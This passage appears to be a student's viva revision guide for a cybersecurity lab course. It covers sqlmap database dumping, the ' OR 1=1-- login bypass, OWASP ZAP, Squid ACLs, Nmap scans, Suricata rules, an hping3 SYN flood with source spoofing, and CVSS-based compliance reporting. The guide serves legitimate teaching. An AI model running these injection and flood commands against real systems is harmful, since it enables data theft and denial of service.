   * **Step 4 (Dump username from `acuart.users.uname`):** Extracted the username stored inside the database `acuart`, table `users`, column `uname` (`sqlmap -u "<target-URL>" -D acuart -T users -C uname --dump`). As recorded in our lab result: *"It gives us username which is there in database as `test`."*

**3. How does the SQL Injection payload ' OR 1=1-- bypass web authentication?**
*[Not found in lab docs - add manually]*
When a vulnerable web application processes a login form, it takes the user-supplied input directly and concatenates it into a backend SQL query without parameterization or sanitization, such as:
```sql
SELECT * FROM users WHERE username = '$user_input' AND password = '$password_input';
```
When an attacker enters the payload `' OR 1=1--` into the username field, the resulting SQL query executed by the database becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'abc';
```
This bypasses authentication through three mechanisms:
1. **Single Quote (`'`):** Closes the opening string literal for the `username` field early.
2. **Boolean Tautology (`OR 1=1`):** Appends a logical `OR` condition where $1=1$ is always universally `TRUE`. Because `FALSE OR TRUE` evaluates to `TRUE`, the entire `WHERE` clause becomes true for every row in the `users` table.
3. **SQL Comment (`--`):** Instructs the SQL interpreter to ignore the remainder of the query (specifically `AND password = '...'`), completely eliminating the password verification check and logging the attacker in as the first user in the table (typically the `admin` account).

**4. What is the difference between Passive Scanning, Spidering, and Active Scanning in OWASP ZAP?**
*[Not found in lab docs - add manually]*
In OWASP ZAP, **Spidering**, **Passive Scanning**, and **Active Scanning** serve distinct roles during a web vulnerability assessment:

| Feature | Spidering (Crawler) | Passive Scanning | Active Scanning |
| :--- | :--- | :--- | :--- |
| **Primary Purpose** | Discovers and maps all pages, links, forms, and endpoints of the web application. | Inspects HTTP requests and responses passing through ZAP without altering them. | Actively attacks discovered pages by sending crafted malicious payloads. |
| **Traffic Modification** | Sends standard HTTP `GET`/`POST` requests to follow links. | **Zero modification:** Only reads existing proxy traffic. | **High modification:** Injects SQLi, XSS, LFI, and command injection payloads. |
| **Risk / Safety Level** | Safe (normal browsing load). | **100% Safe:** Cannot damage the server or database. | **Intrusive / Risky:** Can modify database records, create spam, or crash services. |
| **Typical Findings** | Hidden directories, `robots.txt`, sitemaps, and input parameters. | Missing `HttpOnly`/`Secure` cookie flags, missing CSP/HSTS headers, server banner leaks. | SQL Injection, Reflected/Stored XSS, Path Traversal, Remote Code Execution. |

---

## Experiment 8: Web Access Control & Proxy Server (Squid Proxy & ACLs)

**1. What did you set up in this experiment, and what are the main security functions of a Squid Proxy server?**
*[Not found in lab docs - add manually]*
In this experiment, we installed and configured a **Squid Proxy Server** on Linux (listening on default TCP port `3128`) and configured client web browsers to route HTTP/HTTPS traffic through the proxy. The main security functions of a Squid Proxy server include:
1. **Access Control & URL/Domain Filtering:** Uses Access Control Lists (ACLs) to block access to malicious, social media, or unauthorized websites by domain (`dstdomain`), IP address, port, or keyword (`url_regex`).
2. **User Authentication:** Requires users to authenticate (via `basic_ncsa_auth` and `htpasswd`) before accessing the internet, preventing unauthorized machines on the LAN from using outbound bandwidth.
3. **Traffic Logging & Auditing:** Records every client web request, status code, and byte count in `/var/log/squid/access.log` for incident response and compliance monitoring.
4. **Internal Network Anonymity & Caching:** Masks internal client IP addresses from external web servers and caches frequently requested static web objects to save bandwidth.

**2. How did you configure Access Control Lists (ACLs) and user authentication (htpasswd) in squid.conf?**
*[Not found in lab docs - add manually]*
We configured user authentication and ACL domain blocking in Squid Proxy using the following step-by-step commands:
1. **Install Squid and Apache Utilities:**
   ```bash
   sudo apt update && sudo apt install squid apache2-utils -y
   ```
2. **Create the Encrypted Password File (`htpasswd`):** Created `/etc/squid/passwd` and added a proxy user (`labuser`), setting strong file permissions:
   ```bash
   sudo htpasswd -c /etc/squid/passwd labuser
   sudo chmod 640 /etc/squid/passwd
   sudo chown proxy:proxy /etc/squid/passwd
   ```
3. **Create a Blocked Domains File:** Created `/etc/squid/blocked_sites.txt` containing restricted domains (e.g., `.facebook.com`, `.example.com`).
4. **Configure `/etc/squid/squid.conf`:** Opened `/etc/squid/squid.conf` and added the authentication helper and ACL directives before the default `http_access deny all` rule:
   ```squid
   auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwd
   auth_param basic realm Squid Proxy Lab Authentication
   acl authenticated_users proxy_auth REQUIRED
   acl blocked_domains dstdomain "/etc/squid/blocked_sites.txt"

   http_access deny blocked_domains
   http_access allow authenticated_users
   http_access deny all
   ```
5. **Restart Squid & Configure Browser:** Restarted Squid (`sudo systemctl restart squid`) and configured Firefox's Manual Proxy Configuration to `127.0.0.1` port `3128`.

**3. How does Squid process acl directives and http_access rules when evaluating traffic?**
*[Not found in lab docs - add manually]*
Squid uses a two-part logic consisting of **`acl` definitions** and **`http_access` enforcement rules**, evaluated using a **top-down, first-match-wins** algorithm:
1. **`acl` Directives (Classification Only):** Lines starting with `acl <name> <type> <value>` simply define match conditions (such as matching a source IP subnet or a list of blocked domains). Defining an `acl` by itself does not allow or block any traffic. Creating multiple `acl` lines with the **same name** combines their values using **logical OR** (matching *any* value in the list).
2. **`http_access` Rules (Sequential Enforcement):** Squid evaluates incoming client requests against `http_access allow|deny <acl1> <acl2>` lines sequentially from **top to bottom**:
   * **Logical AND within a single rule:** If multiple ACL names appear on the *same* `http_access` line (e.g., `http_access allow localnet authenticated_users`), **all** listed ACLs must match (**logical AND**) for that rule to trigger.
   * **First Match Wins:** As soon as a request matches an `http_access` line, Squid immediately applies the action (`allow` or `deny`) and stops reading further rules. Therefore, specific `http_access deny blocked_domains` rules must always be placed **above** broad `http_access allow authenticated_users` rules, ending with a catch-all `http_access deny all`.

**4. What key client request details are recorded inside Squid's /var/log/squid/access.log file?**
*[Not found in lab docs - add manually]*
Every time a client browser sends a request through Squid, a single space-delimited line is appended to **`/var/log/squid/access.log`** containing 10 key fields:
```text
1730456789.123    145 192.168.1.50 TCP_DENIED/403 3892 GET http://www.facebook.com/ labuser HIER_NONE/- text/html
```
1. **Timestamp (`1730456789.123`):** Unix epoch time in seconds and milliseconds when the request completed.
2. **Elapsed Time (`145`):** Duration in milliseconds the proxy spent processing the request.
3. **Client Source IP (`192.168.1.50`):** IP address of the requesting client machine.
4. **Squid Result Code & HTTP Status (`TCP_DENIED/403` or `TCP_MISS/200`):** Indicates how Squid handled the request (`TCP_HIT`, `TCP_MISS`, `TCP_DENIED`) paired with the HTTP status code (`200 OK`, `403 Forbidden`, `407 Proxy Authentication Required`).
5. **Bytes Transferred (`3892`):** Total size of the response delivered to the client.
6. **HTTP Request Method (`GET`, `POST`, `CONNECT`):** Method used by the client.
7. **Requested URL (`http://www.facebook.com/`):** Full target URL or `host:port`.
8. **Authenticated Username (`labuser` or `-`):** Username from `htpasswd` authentication.
9. **Hierarchy / Upstream Server (`HIER_DIRECT/<IP>` or `HIER_NONE/-`):** How the object was fetched.
10. **Content MIME Type (`text/html`):** Media type of the response.

---

# Module 5: Network Security

## Topics Covered

### Network Scanning
Network scanning is the active reconnaissance phase used to discover live hosts, open ports, running services, and operating systems on a network. **Nmap (Network Mapper)**, created by Gordon Lyon (Fyodor Vaskovich), accomplishes this by sending specially crafted raw IP packets to target hosts and analyzing their responses while dynamically adjusting for network latency and congestion. Security analysts begin with **Host Discovery (`nmap -sn`)**, which performs a ping sweep without port scanning to identify active IP addresses. Next, a **TCP SYN Stealth Scan (`nmap -sS`)** sends `SYN` packets to probe ports without completing the TCP three-way handshake, followed by **Service Version Detection (`nmap -sV`)**, which interrogates open ports with banner/protocol probes to identify exact software versions (e.g., `vsftpd 2.3.4`, `Apache httpd 2.2.8`). Finally, the **Nmap Scripting Engine (`--script=vuln` or `-sC`)** executes Lua scripts to automate vulnerability detection and configuration auditing.

### Firewalls & IDS
Network perimeter and host defense rely on the complementary deployment of Firewalls and Intrusion Detection Systems (IDS). A host-based firewall like **UFW (Uncomplicated Firewall)** acts as a user-friendly frontend for Linux **`iptables`/`netfilter`**, filtering incoming and outgoing packets inline based on IP addresses, protocols, ports, and **connection tracking states (`NEW`, `ESTABLISHED`, `RELATED`, `INVALID`)**. While a firewall blocks unauthorized ports, a **Network Intrusion Detection System (NIDS)** like **Suricata** or **Snort** inspects deep packet payloads across the network against a database of known attack signatures. Suricata/Snort rules follow a structured syntax consisting of a **Rule Header** (`alert icmp any any -> $HOME_NET any`) and **Rule Options** (`(msg:"ICMP Ping Detected"; itype:8; sid:1000001; rev:1;)`), generating real-time alerts in `fast.log` whenever suspicious traffic traverses the network interface.

### DoS Attacks & Defense
A **Denial of Service (DoS)** attack aims to disrupt the **Availability** of a target server or network resource so legitimate users cannot access it. In a **TCP SYN Flood** simulation, ethical hackers use the command-line packet crafting tool **`hping3`** (`sudo hping3 -S --flood -V -p 80 <target-IP>`) combined with **IP spoofing (`-a <fake-IP>` or `--rand-source`)** to overwhelm a target web server with thousands of TCP `SYN` connection requests per second. Because the spoofed source IPs never reply with the final `ACK` packet to complete the TCP three-way handshake, the target server's backlog queue fills up with **half-open (`SYN_RECV`)** connections, exhausting kernel memory and rejecting legitimate clients. Defending against SYN floods requires enabling **TCP SYN Cookies** (`net.ipv4.tcp_syncookies = 1`), configuring **firewall rate-limiting (`ufw limit` or `iptables -m limit`)**, and deploying NIDS signature thresholds to detect abnormal packet spikes.

---

## Experiment 9: Network Discovery & Security Assessment (Nmap)

**1. What was the main aim of this experiment, and what target did you scan?**
According to our Experiment 9 lab document, the main aim of this experiment was: **"To perform network discovery and security assessment using network scanning tools."** As stated in our lab theory and software requirements, we used **Nmap (Network Mapper)** from our **Kali Linux** virtual machine to scan our target virtual machine (**Metasploitable 2** / local virtual network subnet) in a controlled environment, mapping out whether hosts are up or down, which ports are open or closed, the operating system of the target, names and versions of listening services, estimated uptime, and presence of a firewall.

**2. How did you perform host discovery, port scanning, version detection, and script scanning using Nmap?**
*[Not found in lab docs - add manually]*
Using **Nmap** on our Kali Linux terminal against our target network and Metasploitable VM (e.g., `192.168.56.101` / `10.0.2.x`), we executed the following scanning stages step-by-step:
1. **Host Discovery (Ping Sweep):** Scanned the entire local subnet without port scanning (`-sn`) to identify live hosts that are up:
   ```bash
   nmap -sn 10.0.2.0/24
   ```
2. **TCP SYN Stealth Port Scan:** Scanned the target IP using `-sS` (with `sudo` privileges) to rapidly identify open TCP ports (such as `21/tcp` FTP, `22/tcp` SSH, `23/tcp` Telnet, `80/tcp` HTTP, `445/tcp` SMB, `3306/tcp` MySQL):
   ```bash
   sudo nmap -sS 10.0.2.15
   ```
3. **Service Version & OS Detection:** Probed the open ports using `-sV` and `-O` to determine exact daemon names, software versions, and the target Linux kernel version (`Linux 2.6.X`):
   ```bash
   sudo nmap -sV -O 10.0.2.15
   ```
4. **Nmap Scripting Engine (NSE) Vulnerability Scan:** Ran default safe scripts (`-sC`) and vulnerability assessment scripts (`--script=vuln`) to detect exploitable flaws (such as `vsftpd 2.3.4` backdoor and SMB vulnerabilities):
   ```bash
   sudo nmap -sV --script=vuln 10.0.2.15
   ```

**3. How does a TCP SYN stealth scan (-sS) differ from a full TCP Connect scan?**
*[Not found in lab docs - add manually]*
A **TCP SYN Stealth Scan (`nmap -sS`)** and a **TCP Connect Scan (`nmap -sT`)** differ in how they use the TCP three-way handshake (`SYN` $\rightarrow$ `SYN/ACK` $\rightarrow$ `ACK`) to determine if a port is open:

| Feature | TCP SYN Stealth Scan (`nmap -sS`) | TCP Connect Scan (`nmap -sT`) |
| :--- | :--- | :--- |
| **Handshake Completion** | **Half-Open Scan:** Sends `SYN`. When the target replies with `SYN/ACK` (port open), Nmap immediately sends a `RST` (Reset) packet to tear down the connection before completion. | **Full Handshake:** Sends `SYN`, receives `SYN/ACK`, sends the final `ACK` to establish a full connection, and then closes it. |
| **Packet Sequence (Open Port)** | $\text{Scanner} \xrightarrow{\text{SYN}} \text{Target} \xrightarrow{\text{SYN/ACK}} \text{Scanner} \xrightarrow{\text{RST}} \text{Target}$ | $\text{Scanner} \xrightarrow{\text{SYN}} \text{Target} \xrightarrow{\text{SYN/ACK}} \text{Scanner} \xrightarrow{\text{ACK}} \text{Target} \xrightarrow{\text{RST/FIN}} \text{Target}$ |
| **Privileges Required** | Requires **root / `sudo`** privileges to craft raw TCP packets. | Runs as a **standard unprivileged user** using the OS `connect()` system call. |
| **Stealth & Logging** | Stealthier because application-layer services often do not log connections that never complete the handshake. | Noisier; every open port connection is recorded in application logs. |
| **Speed** | Faster and requires fewer packets. | Slower due to OS socket overhead. |

**4. What does a port status of filtered indicate in Nmap output compared to open or closed?**
*[Not found in lab docs - add manually]*
Nmap classifies scanned ports into three primary states based on the network response received from the target host:
1. **`open`:** An application on the target machine is actively listening on this port for incoming connections (for example, the target responds to a TCP `SYN` probe with a `SYN/ACK` packet). This represents a direct attack surface for exploitation.
2. **`closed`:** The target host is reachable and receives the probe packet, but **no application is listening** on that port (the target's operating system kernel immediately replies to a TCP `SYN` probe with a `RST/ACK` packet, or to a UDP probe with an ICMP Type 3 Code 3 *Port Unreachable* message).
3. **`filtered`:** Nmap **cannot determine whether the port is open or closed** because a dedicated hardware firewall, router ACL, or host firewall (like `ufw`/`iptables` configured with a `DROP` rule) is blocking the probe packets from reaching the port. Either Nmap receives **no response at all** (timeout after retransmissions) or it receives an ICMP Type 3 error code (such as Code 13: *Communication Administratively Prohibited*).

---

## Experiment 10: Network Access Control (Firewalls & IDS / Snort / Suricata)

**1. What did you implement in this experiment, and what tools did you deploy for network protection?**
*[Not found in lab docs - add manually]*
In this experiment, we implemented layered host and network access control by deploying both a host-based stateful firewall and a Network Intrusion Detection System (NIDS) on Linux:
1. **UFW (Uncomplicated Firewall) / `iptables`:** Deployed as an inline host firewall to enforce default-deny ingress filtering, explicitly allow authorized administrative services (like SSH/HTTP), and block unauthorized port scans or ping requests.
2. **Suricata (or Snort) NIDS:** Deployed to passively monitor network interface traffic in real time using custom signature detection rules (`local.rules`) to alert administrators in `/var/log/suricata/fast.log` (or `/var/log/snort/alert`) whenever suspicious ICMP ping sweeps or Nmap SYN scans occurred.

**2. How did you configure UFW firewall rules and set up Suricata/Snort with custom detection rules?**
*[Not found in lab docs - add manually]*
We configured the UFW firewall and Suricata/Snort IDS using the following step-by-step commands:
1. **Configure UFW Firewall Policies:**
   * Set the default incoming policy to `deny` and outgoing policy to `allow`:
     ```bash
     sudo ufw default deny incoming
     sudo ufw default allow outgoing
     ```
   * Allowed SSH (`22/tcp`) and HTTP (`80/tcp`), denied Telnet (`23/tcp`), and enabled the firewall:
     ```bash
     sudo ufw allow 22/tcp
     sudo ufw allow 80/tcp
     sudo ufw deny 23/tcp
     sudo ufw enable
     sudo ufw status verbose
     ```
2. **Configure Custom Suricata/Snort Detection Rules:**
   * Opened the custom rule file (`/etc/suricata/rules/local.rules` or `/etc/snort/rules/local.rules`) and added a rule to detect incoming ICMP Echo Requests (pings) and Nmap SYN scans:
     ```text
     alert icmp any any -> $HOME_NET any (msg:"CUSTOM-IDS ICMP Ping Detected"; itype:8; sid:1000001; rev:1;)
     alert tcp any any -> $HOME_NET any (msg:"CUSTOM-IDS Nmap SYN Scan Detected"; flags:S; threshold:type both, track by_src, count 20, seconds 5; sid:1000002; rev:1;)
     ```
3. **Run NIDS & Monitor Live Alerts:** Started Suricata/Snort on the active network interface (`eth0`) and verified alerts in real time while pinging/scanning from the attacker machine:
   ```bash
   sudo suricata -c /etc/suricata/suricata.yaml -i eth0
   sudo tail -f /var/log/suricata/fast.log
   ```

**3. What is the functional difference between an inline firewall (UFW) and a passive NIDS (Suricata/Snort)?**
*[Not found in lab docs - add manually]*
An **inline firewall (UFW/`iptables`)** and a **passive NIDS (Suricata/Snort in IDS mode)** perform fundamentally different roles in network security:

| Feature | Inline Host Firewall (UFW / `iptables`) | Passive NIDS (Suricata / Snort) |
| :--- | :--- | :--- |
| **Deployment Mode** | **Inline (Preventive Control):** Sits directly in the kernel network stack path (`netfilter`); every packet must pass through it to reach the OS. | **Passive / Tap (Detective Control):** Listens on a network interface in promiscuous mode, inspecting copies of packets. |
| **Primary Action** | Actively **allows (`ACCEPT`)**, **blocks (`DROP`)**, or **rejects (`REJECT`)** traffic before it reaches the application. | Generates **real-time alerts and logs** when traffic matches attack signatures without dropping the packet (unless configured in inline IPS mode). |
| **Inspection Depth** | Primarily inspects **Layer 3 (IP)** and **Layer 4 (TCP/UDP ports & connection states: `NEW`, `ESTABLISHED`)**. | Performs **Deep Packet Inspection (DPI)** up to **Layer 7 (Application payload)** to spot SQLi, shellcode, or malware signatures inside allowed ports. |

**4. What is the basic structure and syntax of a custom Suricata/Snort rule matching ICMP traffic?**
*[Not found in lab docs - add manually]*
Every Suricata or Snort rule consists of two main parts: the **Rule Header** (defining the action, protocol, source/destination IPs, ports, and direction) and the **Rule Options** enclosed in parentheses `()` (containing alert messages, payload/header conditions, and rule identifiers).
For example, a custom rule matching an incoming ICMP Echo Request (ping) is written as:
```text
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; itype:8; icode:0; sid:1000001; rev:1;)
```
* **Rule Header Breakdown:**
  * `alert`: Action taken when the rule matches (log the event and generate an alert).
  * `icmp`: Network protocol being inspected (`tcp`, `udp`, `icmp`, `ip`).
  * `any any`: Source IP address (`any`) and Source Port (`any` — ICMP does not use ports).
  * `->`: Direction operator indicating traffic flowing from source to destination.
  * `$HOME_NET any`: Destination IP variable (`$HOME_NET`) and Destination Port (`any`).
* **Rule Options Breakdown:**
  * `msg:"ICMP Ping Detected";`: Human-readable description printed in `fast.log`.
  * `itype:8; icode:0;`: Matches ICMP Type 8 (Echo Request) and Code 0.
  * `sid:1000001;`: Unique Signature ID (`>1000000` is reserved for custom local rules).
  * `rev:1;`: Rule revision number.

---

## Experiment 11: DoS Attack Simulation & Defense (hping3)

**1. What was the objective of this experiment, and what tool did you use to generate attack traffic?**
*[Not found in lab docs - add manually]*
The objective of this experiment was to simulate a **TCP SYN Flood Denial of Service (DoS) attack** in an isolated virtual laboratory environment, analyze the resulting network traffic and server resource exhaustion, and evaluate defensive countermeasures (firewall rate-limiting and IDS alerting). To generate the high-volume DoS attack traffic from Kali Linux, we used **`hping3`**, a command-line TCP/IP packet crafting and network testing utility, alongside **Wireshark / `tcpdump`** and **`netstat`** (configured per our lab software requirements) to observe the flood.

**2. How did you execute a SYN flood attack using hping3 and evaluate defense mechanisms?**
*[Not found in lab docs - add manually]*
We executed the SYN flood simulation and evaluated defensive controls using the following step-by-step procedure:
1. **Launch TCP SYN Flood from Kali Linux (`hping3`):** Executed `hping3` with root privileges targeting port `80` of the target VM (`10.0.2.15`) using the `--flood` flag and IP spoofing (`--rand-source` or `-a`):
   ```bash
   sudo hping3 -S --flood -V -p 80 --rand-source 10.0.2.15
   ```
   *(Where `-S` sets the TCP SYN flag, `--flood` sends packets as fast as possible without waiting for replies, `-V` enables verbose output, `-p 80` targets HTTP port 80, and `--rand-source` spoofs random source IP addresses).*
2. **Observe Impact on Target Machine:**
   * Captured the incoming flood in **Wireshark** / `tcpdump` (`sudo tcpdump -i eth0 tcp port 80`).
   * Checked half-open TCP connections on the target server:
     ```bash
     netstat -ant | grep SYN_RECV
     ```
3. **Implement & Evaluate Defenses on Target:**
   * Enabled kernel **TCP SYN Cookies** to prevent backlog queue exhaustion:
     ```bash
     sudo sysctl -w net.ipv4.tcp_syncookies=1
     ```
   * Configured **UFW / `iptables` connection rate-limiting** to drop excessive SYN packets per IP:
     ```bash
     sudo ufw limit 80/tcp
     ```
   * Verified that Suricata/Snort logged a high-rate SYN flood alert in `fast.log`.

**3. How does a TCP SYN flood attack (hping3 --flood -S) exhaust target server resources?**
*[Not found in lab docs - add manually]*
A **TCP SYN Flood (`hping3 --flood -S`)** exploits the stateful nature of the standard **TCP Three-Way Handshake**:
1. Normally, a client initiates a TCP connection by sending a `SYN` (Synchronize) packet to the server.
2. Upon receiving the `SYN` packet, the server allocates a **Transmission Control Block (TCB)** data structure in kernel memory, places the connection in the **`SYN_RECV` (half-open)** state inside a finite **SYN backlog queue**, and replies with a `SYN/ACK` packet while waiting for the client's final `ACK`.
3. During an `hping3 --flood -S` attack, the attacker blasts tens of thousands of `SYN` packets per second and intentionally never responds with the final `ACK` (or uses spoofed IPs so the `SYN/ACK` goes to unreachable hosts).
4. Because each half-open `SYN_RECV` entry remains in the server's finite backlog queue until the TCP retransmission timer expires (typically 30–60 seconds), the backlog queue rapidly reaches $100\%$ capacity. Once full, the server is forced to drop all new incoming `SYN` requests, denying service to legitimate users.

**4. What is the purpose of IP address spoofing (-a) during a DoS simulation?**
*[Not found in lab docs - add manually]*
During a TCP SYN flood simulation using `hping3`, specifying a spoofed source IP address (`-a <fake-IP>`) or random source IPs (`--rand-source`) serves three critical purposes for the attacker:
1. **Preventing the Attacker's Own OS Kernel from Sending `RST` Packets:** If the attacker sends `SYN` packets using their real IP address, the target server will reply with `SYN/ACK` packets back to the attacker's machine. Because the attacker's OS kernel did not initiate a legitimate socket connection, the attacker's own OS would automatically reply with a TCP `RST` (Reset) packet, which would immediately close the half-open connection on the target server and ruin the SYN flood! Spoofing an unreachable IP ensures the target's `SYN/ACK` goes nowhere and the connection stays stuck in `SYN_RECV`.
2. **Bypassing Per-IP Firewall Rate Limiting:** Using `--rand-source` makes every `SYN` packet appear to originate from a different IP address, defeating simple per-IP `ufw limit` rules.
3. **Identity Concealment:** Masks the true origin IP address of the attacking machine in basic server logs.

---

# Module 6: Cyber Law, Ethics & Standards

## Topics Covered

### Vulnerability Assessment
A **Vulnerability Assessment (VA)** is a systematic, non-destructive process of identifying, quantifying, and prioritizing security weaknesses across systems, networks, and applications before attackers can exploit them. Enterprise security teams use automated vulnerability scanners like **OpenVAS / Greenbone Vulnerability Management (GVM)** and **Tenable Nessus**, which probe target hosts against tens of thousands of Network Vulnerability Tests (NVTs) and CVE (Common Vulnerabilities and Exposures) signatures. Unlike penetration testing, which actively exploits flaws to gain unauthorized access, a VA scanner catalogs every discovered weakness and assigns a standardized risk score using the **Common Vulnerability Scoring System (CVSS v3.x)**. CVSS v3 calculates a numerical score from `0.0` to `10.0` based on Base metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and CIA Impact) and groups findings into severity bands: **Critical (`9.0–10.0`)**, **High (`7.0–8.9`)**, **Medium (`4.0–6.9`)**, **Low (`0.1–3.9`)**, and **None (`0.0`)**.

### Compliance Reporting
Technical scan outputs must be translated into structured **Compliance and Audit Reports** so both executive leadership and system administrators can act on the findings. A professional report begins with an **Executive Summary** written in non-technical business language that highlights the overall risk posture, total vulnerability distribution by severity, and strategic recommendations, followed by a detailed **Technical Findings Matrix** containing CVE IDs, affected ports, proof-of-concept evidence, and step-by-step remediation instructions. To satisfy regulatory and legal mandates, each technical vulnerability is mapped to international security frameworks—such as **ISO/IEC 27001** (Annex A controls), **NIST Cybersecurity Framework (CSF)**, **CIS Critical Security Controls**, and **PCI-DSS**—and assigned binding **Remediation Service Level Agreements (SLAs)** (e.g., patching Critical flaws within 24–72 hours and High flaws within 7–14 days).

---

## Experiment 12: Vulnerability Assessment & Compliance Reporting

**1. What did you perform in this experiment, and what scanner did you use to audit the target machine?**
*[Not found in lab docs - add manually]*
In this experiment, we performed a comprehensive **automated Vulnerability Assessment (VA)** and prepared a formal **Cybersecurity Compliance and Remediation Report** for our intentionally vulnerable target virtual machine (**Metasploitable 2**). To audit the target machine from Kali Linux, we used an enterprise vulnerability scanner—**OpenVAS / Greenbone Vulnerability Management (GVM)** (or **Tenable Nessus Essentials**)—which scanned the target's network services against updated CVE vulnerability feeds, classified each discovered flaw using **CVSS v3 severity ratings**, and mapped the technical findings to international security standards (**ISO/IEC 27001**, **NIST CSF**, and **CIS Controls**).

**2. How did you run a scan, classify findings by CVSS severity, and prepare a final compliance report?**
*[Not found in lab docs - add manually]*
We executed the vulnerability assessment and compliance reporting workflow in four steps:
1. **Initialize and Access the Scanner (OpenVAS/GVM or Nessus):** Started the Greenbone Vulnerability Manager service on Kali Linux (`sudo gvm-start`), opened the web interface at `https://127.0.0.1:9392` (or `https://localhost:8834` for Nessus), and logged into the dashboard.
2. **Configure Target and Execute Scan:** Navigated to **Scans > Tasks**, used the Task Wizard to create a **Full and Fast Scan** targeting the IP address of the Metasploitable 2 VM (`10.0.2.15`), and waited for the scan status to reach `Done`.
3. **Classify Findings by CVSS v3 Severity:** Exported the scan results (PDF/CSV) and categorized discovered vulnerabilities into severity bands:
   * **Critical (`9.0–10.0`):** e.g., `vsftpd 2.3.4` backdoor (` port 21`), `Ingreslock` root shell (`port 1524`), UnrealIRCd backdoor.
   * **High (`7.0–8.9`):** e.g., Samba `usermap_script` RCE (`CVE-2007-2447`), default `postgres`/`VNC` passwords.
   * **Medium (`4.0–6.9`) & Low (`0.1–3.9`):** e.g., Weak SSL/TLS ciphers, cleartext Telnet (`port 23`), timestamp disclosures.
4. **Prepare the Compliance Report:** Drafted an **Executive Summary**, mapped each vulnerability to **ISO/IEC 27001** and **CIS Controls**, and assigned remediation SLA timelines.

**3. How are CVSS v3 scores used to categorize vulnerability severity and assign remediation priority timelines?**
*[Not found in lab docs - add manually]*
The **Common Vulnerability Scoring System (CVSS v3.x)** provides a standardized numerical score from `0.0` to `10.0` based on how easy a vulnerability is to exploit (**Exploitability Metrics**: Attack Vector, Attack Complexity, Privileges Required, User Interaction) and the damage it causes (**Impact Metrics**: Confidentiality, Integrity, and Availability). Organizations use these qualitative severity bands to enforce strict **Remediation SLA Priority Timelines**:

| CVSS v3.x Score Range | Qualitative Severity Rating | Typical Vulnerability Characteristics | Standard Remediation SLA Timeline |
| :--- | :--- | :--- | :--- |
| **`9.0 – 10.0`** | **Critical** | Remotely exploitable over the network (`AV:N`) without authentication (`PR:N`), leading to full root/system compromise (RCE). | **Immediate: Within 24 to 72 hours** (Emergency patching or service isolation). |
| **`7.0 – 8.9`** | **High** | Exploitable flaws causing significant data breach, privilege escalation, or service disruption, sometimes requiring low privileges. | **High Priority: Within 7 to 14 days**. |
| **`4.0 – 6.9`** | **Medium** | Requires local/network interaction, complex conditions, or results in partial information disclosure / XSS. | **Scheduled Maintenance: Within 30 days**. |
| **`0.1 – 3.9`** | **Low** | Minor configuration weaknesses or local-only flaws with minimal business impact. | **Routine Cycle: Within 60 to 90 days**. |
| **`0.0`** | **None (Informational)** | Open port discoveries or banner grabs with no direct exploitability. | **No mandatory SLA** (Review for hardening). |

**4. How do you map an unpatched service vulnerability to security controls in CIS Controls or ISO/IEC 27001?**
*[Not found in lab docs - add manually]*
When a vulnerability scanner flags an **unpatched or outdated network service vulnerability** (such as outdated Apache httpd, Samba `CVE-2007-2447`, or OpenSSH running on Metasploitable), compliance auditors map the finding to specific clauses in international frameworks to demonstrate regulatory non-compliance:
* **ISO/IEC 27001:2022 Mapping:**
  * **Annex A.8.8 (Management of Technical Vulnerabilities):** Requires organizations to obtain timely information about technical vulnerabilities of information systems in use, evaluate their exposure, and apply appropriate patches or mitigations within defined timelines.
  * **Annex A.8.9 (Configuration Management):** Requires establishing, documenting, and monitoring secure baseline configurations and disabling unnecessary services/ports (such as Telnet or `rlogin`).
  * **Annex A.8.19 (Installation of Software on Operational Systems):** Governs controlled, secure updates of operational software.
* **CIS Critical Security Controls (CIS Controls v8) Mapping:**
  * **CIS Control 7 (Continuous Vulnerability Management):** Specifically **Safeguard 7.4** (*Perform Automated Operating System Patch Management*) and **Safeguard 7.5** (*Perform Automated Application Patch Management*) mandate automated monthly/weekly patching and continuous authenticated vulnerability scanning.
  * **CIS Control 4 (Secure Configuration of Enterprise Assets and Software):** Mandates removing unnecessary services and changing default vendor credentials (`msfadmin/msfadmin`).

---

# General Cyber Security Viva Questions

**1. What is the CIA Triad (Confidentiality, Integrity, Availability), and how does each principle protect digital assets?**
The **CIA Triad** is the foundational model of information security used to guide policies, controls, and risk management across an organization:
1. **Confidentiality:** Ensures that sensitive information is accessed only by authorized individuals and kept secret from unauthorized disclosure.
   * *Threats:* Packet sniffing, credential harvesting (`setoolkit`), SQLi data dumping, public S3 buckets.
   * *Protection Controls:* Encryption at rest and in transit (**AES, RSA, TLS/HTTPS**), Multi-Factor Authentication (**MFA**), and strict IAM access controls.
2. **Integrity:** Guarantees the accuracy, completeness, and trustworthiness of data, ensuring it has not been tampered with or altered in an unauthorized manner during storage or transit.
   * *Threats:* Man-in-the-Middle (MitM) packet modification, unauthorized file deletion (`s3:DeleteObject`).
   * *Protection Controls:* Cryptographic hash functions (**SHA-256**), digital signatures, S3 Object Lock/Versioning, and read-only permission boundaries.
3. **Availability:** Ensures that information systems, networks, and data are reliably accessible and operational whenever needed by authorized users.
   * *Threats:* TCP SYN Flood DoS attacks (`hping3`), ransomware, hardware failure.
   * *Protection Controls:* Firewall rate-limiting (`ufw limit`), TCP SYN cookies, load balancers, and redundant cloud backups.

**2. What is the concept of Defense in Depth, and how was it applied across your lab exercises?**
**Defense in Depth** (also known as the "Castle Approach") is a cybersecurity strategy that deploys multiple, overlapping layers of security controls (physical, technical, and administrative) throughout an IT system. If an attacker successfully bypasses or breaches one defensive layer, the subsequent layers continue to protect the underlying asset and detect the intrusion.
Across our laboratory experiments, we applied Defense in Depth at every layer:
* **Network Perimeter & Host Layer (Module 5):** We configured **UFW (`iptables`)** to block unauthorized ports and rate-limit SYN floods (`hping3`), while running **Suricata/Snort NIDS** behind the firewall to inspect allowed traffic for ICMP sweeps and scan signatures.
* **Web & Application Layer (Module 4):** We deployed **Squid Proxy** with `htpasswd` authentication and domain ACLs to filter outbound web traffic, and used **OWASP ZAP** to remediate SQL Injection flaws in web apps.
* **Identity & Data Layer (Modules 2 & 3):** In AWS S3, even if an IAM user had access permissions, we added a second layer requiring **MFA** for `s3:DeleteObject`, enforced high password entropy (`pwscore`), and encrypted sensitive data using **AES/RSA** in CrypTool.

**3. What is the exact distinction between Authentication ("Who are you?") and Authorization ("What can you do?")?**
